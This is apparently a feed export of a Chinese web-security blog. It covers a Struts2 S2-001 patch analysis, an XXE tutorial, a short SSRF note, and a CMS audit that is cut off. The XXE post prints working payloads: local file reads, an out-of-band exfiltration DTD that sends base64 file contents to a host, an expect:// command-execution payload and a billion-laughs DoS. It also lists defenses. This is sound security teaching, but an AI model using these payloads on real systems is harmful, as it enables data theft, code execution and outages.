src="http://images.xianyu123.club/20200817160321.png" alt="image-20200817160321742"></p><p><img src="http://images.xianyu123.club/20200817160454.png" alt="image-20200817160454389"></p><p>因为expr值为<code>%{password}</code>，解析结果为<code>%{1+1}</code>，然后递归调用了<code>translateVariables()</code>方法，因为这是OGNL表达式，所以得到值为2，关于OGNL的知识，可以参考：<a href="https://blog.csdn.net/tjcyjd/article/details/6850203" target="_blank" rel="noopener">Struts2中的OGNL详解</a></p><h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>在<a href="https://archive.apache.org/dist/struts/source/struts-2.0.9-src.zip" target="_blank" rel="noopener">Struts 2.0.9</a> 和 XWork 2.0.4修复了此漏洞。</p><p>在idea中，我们使用compare with功能对比了XWork 2.0.3和XWork 2.0.4的代码（左侧为XWork 2.0.3，右侧为XWork 2.0.4）</p><p>这里新增了变量<code>MAX_RECURSION=1</code></p><p><img src="http://images.xianyu123.club/20200818205338.png" alt="image-20200818205338668"></p><p>这里禁止了OGNL表达式的递归操作</p><p><img src="http://images.xianyu123.club/20200818205506.png" alt="image-20200818205506273"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">【Struts2-命令-代码执行漏洞分析系列】S2-001</a></li><li><a href="https://xz.aliyun.com/t/2672" target="_blank" rel="noopener">从零开始学习struts2漏洞 S2-001</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从零开始学习struts2漏洞———S2-001&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>对xxe漏洞的一些思考</title>
    <link href="http://0clickjacking0.github.io/2020/08/12/%E5%AF%B9xxe%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://0clickjacking0.github.io/2020/08/12/对xxe漏洞的一些思考/</id>
    <published>2020-08-12T09:18:56.000Z</published>
    <updated>2020-08-19T06:48:27.058Z</updated>
    
    <content type="html"><![CDATA[<p>对xxe漏洞的一些思考</p><a id="more"></a><h1 id="XML的基础知识"><a href="#XML的基础知识" class="headerlink" title="XML的基础知识"></a>XML的基础知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>我在知乎上找到相对通俗的解释，如下：</p><p>以一种约定的字符串来表示某些常用数据类型，例如Map或者Array、Two-Dimensional Array。 因为双方都有约定，不同的应用就可以通过这些字符串进行数据的交换。 例如作为配置文件，那么应用本身可以读取这些配置，而文本编辑软件也可以按照约定的格式来编辑这些字符串，那么就实现了人肉和应用的数据的交换。 又例如作为网络应用，服务端发出这些字符串，客户端接收到后parse，就可以实现服务端传输一个Map的数据（举例）到客户端。 另外XML带有大量信息冗余，这样也方便人的阅读。</p><h2 id="文档结构"><a href="#文档结构" class="headerlink" title="文档结构"></a>文档结构</h2><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档，note为根元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p><h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h3 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD"></a>引用外部DTD</h3><p><code>SYSTEM</code>关键字表示DTD文件是私有的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="引用公有的DTD"><a href="#引用公有的DTD" class="headerlink" title="引用公有的DTD"></a>引用公有的DTD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD名称&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体其实可以理解为是一个变量，我们可以在 XML 中通过<code>&amp;</code>符号进行引用。从上述的引用方式来看，实体可以分为<code>内部实体</code>与<code>外部实体</code>。从另一个角度来说，实体又可以分为<code>通用实体</code>和<code>参数实体</code>。我们一个个来说。</p><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe "flag" &gt;]&gt;</span></span><br></pre></td></tr></table></figure><p>这里 定义元素为<code>ANY</code>说明接受任何元素，但是定义了一个 xml 的实体，那么 XML 就可以写成这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们使用<code>&amp;xxe</code>对 上面定义的 xxe 实体进行了引用，到时候输出的时候<code>&amp;xxe</code>就会被<code>&quot;flag&quot;</code>替换。</p><p><img src="http://images.xianyu123.club/20200813164822.png" alt="image-20200813164822756"></p><p><img src="http://images.xianyu123.club/20200813164838.png" alt="image-20200813164837975"></p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///flag" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h3><p>我个人的理解是与上述外部实体是一回事，只是叫法不同</p><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>(1)使用 <code>% 实体名</code>(<strong>这里%后面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 来进行引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><h1 id="xxe能做什么？"><a href="#xxe能做什么？" class="headerlink" title="xxe能做什么？"></a>xxe能做什么？</h1><p><img src="http://images.xianyu123.club/20200819144809.png" alt="此处输入图片的描述"></p><p>PHP在安装扩展以后还能支持的协议：</p><p><img src="http://images.xianyu123.club/20200819144823.png" alt="此处输入图片的描述"></p><h2 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h2><p><strong>示例代码：</strong></p><p><strong>xml.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>payload</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY flag SYSTEM &quot;file:////Users/xianyu123/flag&quot;&gt; ]&gt; </span><br><span class="line">&lt;a&gt;&amp;flag;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>可以看到文件内容被读取了，<strong>结果如下</strong>：</p><p><img src="http://images.xianyu123.club/20200813171355.png" alt="image-20200813171355703"></p><p>然后我们创建一个文件<code>test.txt</code>，内容如下</p><p><img src="http://images.xianyu123.club/20200813172145.png" alt="image-20200813172145757"></p><p>然后尝试读取时，发现报错了，<strong>结果如下</strong>：</p><p><img src="http://images.xianyu123.club/20200813172244.png" alt="image-20200813172244173"></p><h3 id="CDATA标签"><a href="#CDATA标签" class="headerlink" title="CDATA标签"></a>CDATA标签</h3><p>CDATA 全名:character data。所有 XML 文档中的文本均会被解析器解析，除了 CDATA 区段（CDATA section）中的文本会被解析器忽略。</p><p>CDATA的形式如下：<code>&lt;![CDATA[文本内容]]&gt;</code> 。</p><p>CDATA的文本内容中不能出现字符串“]]&gt;”。另外，CDATA不能嵌套。</p><p>XML 实例: 在CDATA标记中的信息被解析器原封不动地传给应用程序，并且不解析该段信息中的任何控制标记。 CDATA区域是由<code>&lt;![CDATA[&quot;为开始标记，以“]]&gt;</code>为结束标记，注意CDATA为大写。</p><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，下面我们来分析一下如何做到。</p><p>首先，找到问题出现的地方，问题出现在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY flag SYSTEM &quot;file:////Users/xianyu123/test.txt&quot;&gt; ]&gt; </span><br><span class="line">&lt;a&gt;&amp;flag;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>在XML中，有时实体内包含了些字符，如<code>&amp;</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&quot;</code>，<code>&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误，所以我们把数据放在<code>&quot;&lt;![CDATA[&quot;和 “]]&gt;&quot;</code>中，但是好像没有任何语法告诉我们字符串能拼接的，这里多个实体连续引用的方法是行不通的，所以我们就需要引入DTD文件，然后使用参数实体。</p><p>在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p><p><strong>payload</strong>：</p><p>这里dtd引用的内容可以是本地的，也可以是公网上的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % start "&lt;![CDATA["&gt;   </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % test SYSTEM "file:///Users/xianyu123/test.txt"&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % end "]]&gt;</span>"&gt;  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">localhost:82</span>/<span class="attr">WWW</span>/<span class="attr">test.dtd</span>"&gt;</span> </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;all;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>test.dtd</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">all</span> "%<span class="attr">start</span>;%<span class="attr">test</span>;%<span class="attr">end</span>;"&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下</strong>：</p><p><img src="http://images.xianyu123.club/20200813220408.png" alt="image-20200813220408547"></p><p><strong>调用过程</strong>：这里从上到下执行，首先执行payload第7行的中的<code>%dtd;</code>，然后把<code>http://localhost:82/WWW/test.dtd</code>内容引入到了payload中，这里有点类似于将 <code>test.dtd</code>包含进来。然后再执行第10行的<code>&amp;all;</code>，然后就是一次执行<code>%start;%test;%end;</code>，最后把文件内容加载了出来</p><h2 id="无回显读取本地文件"><a href="#无回显读取本地文件" class="headerlink" title="无回显读取本地文件"></a>无回显读取本地文件</h2><p><strong>xml.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>test.dtd</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///Users/xianyu123/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://127.0.0.1:10006?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE payload [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>结果如下</strong>：</p><p><img src="http://images.xianyu123.club/20200814143940.png" alt="image-20200814143940322"></p><p><img src="http://images.xianyu123.club/20200814143953.png" alt="image-20200814143953166"></p><p>这里执行的原理与上述CDATA标签的原理类似，就不再过多赘述</p><h2 id="HTTP-内网主机探测"><a href="#HTTP-内网主机探测" class="headerlink" title="HTTP 内网主机探测"></a>HTTP 内网主机探测</h2><h2 id="HTTP-内网主机端口扫描"><a href="#HTTP-内网主机端口扫描" class="headerlink" title="HTTP 内网主机端口扫描"></a>HTTP 内网主机端口扫描</h2><h2 id="PHP-expect-命令执行（RCE）"><a href="#PHP-expect-命令执行（RCE）" class="headerlink" title="PHP expect 命令执行（RCE）"></a>PHP expect 命令执行（RCE）</h2><p>PHP 的 expect 扩展并不是默认安装的，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;/file&gt;</span><br><span class="line">&lt;/dir&gt;</span><br></pre></td></tr></table></figure><h2 id="利用-XXE-进行-DOS-攻击"><a href="#利用-XXE-进行-DOS-攻击" class="headerlink" title="利用 XXE 进行 DOS 攻击"></a>利用 XXE 进行 DOS 攻击</h2><p><strong>示例代码：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol "lol"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id="方案一：使用语言中推荐的禁用外部实体的方法"><a href="#方案一：使用语言中推荐的禁用外部实体的方法" class="headerlink" title="方案一：使用语言中推荐的禁用外部实体的方法"></a><strong>方案一：使用语言中推荐的禁用外部实体的方法</strong></h3><p><strong>PHP：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p><strong>JAVA:</strong></p><p><strong>Python：</strong></p><h3 id="方案二：黑名单过滤-不推荐"><a href="#方案二：黑名单过滤-不推荐" class="headerlink" title="方案二：黑名单过滤(不推荐)"></a><strong>方案二：黑名单过滤(不推荐)</strong></h3><p>过滤关键词：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCTYPE、ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a></li><li><a href="https://hpdoger.cn/2019/01/07/从两道CTF题目学习XXE漏洞/" target="_blank" rel="noopener">从两道CTF题目学习XXE漏洞</a></li><li><a href="https://www.zhihu.com/question/31353595" target="_blank" rel="noopener">XML到底是干什么的?</a></li><li><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">浅谈XXE漏洞攻击与防御</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对xxe漏洞的一些思考&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>从代码审计的角度来看SSRF漏洞</title>
    <link href="http://0clickjacking0.github.io/2020/08/12/%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E8%A7%92%E5%BA%A6%E6%9D%A5%E7%9C%8BSSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://0clickjacking0.github.io/2020/08/12/从代码审计的角度来看SSRF漏洞/</id>
    <published>2020-08-12T09:18:36.000Z</published>
    <updated>2020-08-24T02:24:10.142Z</updated>
    
    <content type="html"><![CDATA[<p>从代码审计的角度来看SSRF漏洞</p><a id="more"></a><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">浅析SSRF原理及利用方式</a></li><li><a href="https://xz.aliyun.com/t/7405" target="_blank" rel="noopener">SSRF漏洞的利用与攻击内网应用实战</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从代码审计的角度来看SSRF漏洞&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>极致cms v1.7的一次审计</title>
    <link href="http://0clickjacking0.github.io/2020/06/18/%E6%9E%81%E8%87%B4cms%20v1.7%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/"/>
    <id>http://0clickjacking0.github.io/2020/06/18/极致cms v1.7的一次审计/</id>
    <published>2020-06-18T03:08:05.000Z</published>
    <updated>2020-08-24T02:23:32.016Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区——<a href="https://xz.aliyun.com/t/7872" target="_blank" rel="noopener">极致cms v1.7的一次审计</a>，转载时请标明出处</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次极致cms v1.7的一次比较全面的审计（除了插件部分，我觉得应该审计的差不多了），大佬们轻喷。</p><p>其实插件部分已经被<a href="https://xz.aliyun.com/u/17117" target="_blank" rel="noopener">爱吃猫的闲鱼</a>师傅审计发到先知上了</p><p>文章地址：<a href="https://xz.aliyun.com/t/7775" target="_blank" rel="noopener">某cms代码审计引发的思考</a></p><p>细心的朋友读完我这篇文章应该就能发现其实是同一个cms</p><h1 id="网站目录结构"><a href="#网站目录结构" class="headerlink" title="网站目录结构"></a>网站目录结构</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── 404.html</span><br><span class="line">├── A（admin后台的一些文件，审计重点）</span><br><span class="line">├── Conf（一些网站的配置文件，公共函数）</span><br><span class="line">├── FrPHP（框架）</span><br><span class="line">├── Home（用户的一些文件，审计核心）</span><br><span class="line">├── Public（上传文件保存的地方）</span><br><span class="line">├── README.md</span><br><span class="line">├── admin.php（后台入口）</span><br><span class="line">├── backup（数据库备份文件）</span><br><span class="line">├── cache（网站缓存）</span><br><span class="line">├── favicon.ico</span><br><span class="line">├── index.php（前台入口）</span><br><span class="line">├── install（安装目录）</span><br><span class="line">├── readme.txt</span><br><span class="line">├── sitemap.xml</span><br><span class="line">├── static（一些静态文件）</span><br><span class="line">└── web.config</span><br></pre></td></tr></table></figure><h1 id="网站的一些公共函数"><a href="#网站的一些公共函数" class="headerlink" title="网站的一些公共函数"></a>网站的一些公共函数</h1><p>由于下面的漏洞需要频繁的用到这个函数，所以我就单独拿出来先讲解一下。</p><h2 id="frparam"><a href="#frparam" class="headerlink" title="frparam()"></a>frparam()</h2><p><code>/FrPHP/lib/Controller.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 